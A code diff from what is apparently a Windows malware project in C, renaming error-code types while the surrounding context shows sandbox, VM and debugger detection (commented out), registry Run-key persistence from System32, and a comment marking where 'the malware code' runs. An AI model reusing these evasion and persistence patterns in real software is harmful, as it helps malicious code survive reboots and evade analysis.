@@ -38,8 +38,8 @@ int main(int argc, char** argv) {
     // Sleep(300000);
 
     // // detect vms, sandboxes, and debuggers!
-    // ERR_CODE ret = detectAnalysisTools();
-    // if (ret != ECODE_SAFE_RET) {
+    // RET_CODE ret = detectAnalysisTools();
+    // if (ret != R_SAFE_RET) {
     //     printf("RET: %s", getErrMessage(ret));
     //     exit(1);
     // }
@@ -75,19 +75,19 @@ static void run(char* path, char* arg) {
     // if we are being run from System32 for the first time! 
     // then we want to generate 
     if (strcmp(arg, FIRST_RUN_FROM_SYS32) == 0) {  // -007 
-        ERR_CODE ret;
+        RET_CODE ret;
         if (!is64Bit) { ret = generateRegKey(EXEC_PATH1, RUN_FROM_REGISTRY, KEY_WRITE); } 
         else          { ret = generateRegKey(EXEC_PATH2, RUN_FROM_REGISTRY, KEY_WRITE | KEY_WOW64_64KEY); }
 
-        if (ret != ECODE_SUCCESS) {
+        if (ret != R_SUCCESS) {
             printf("Failed to generate registry key.\n");
         }
     }
 
     __exec__:  // run the malware code as normal
     
-    ERR_CODE ret = setup();  
-    if (ret != ECODE_SUCCESS) {
+    RET_CODE ret = setup();  
+    if (ret != R_SUCCESS) {
         printErr(ret);
         programCleanup();
         exit(ret);
@@ -151,7 +151,7 @@ static void copyAndLaunch(char* path) {
 
 // static void run() {
 //     int ret = setup();
-//     if (ret != ECODE_SUCCESS) {
+//     if (ret != R_SUCCESS) {
 //         printErr(ret);
 //         programCleanup();
 //         exit(ret);
